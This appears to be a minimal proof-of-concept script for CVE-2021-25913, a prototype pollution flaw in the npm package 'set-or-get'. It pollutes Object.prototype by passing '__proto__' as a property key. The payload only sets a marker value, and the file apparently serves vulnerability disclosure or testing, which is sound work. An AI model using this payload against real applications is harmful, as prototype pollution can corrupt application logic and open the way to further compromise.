//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913
var SetOrGet = require("set-or-get");

function test(prop1, prop2, val) {
  SetOrGet({}, prop1, {})[prop2] = val;
}

test("__proto__", "polluted", "yes")

module.exports = test
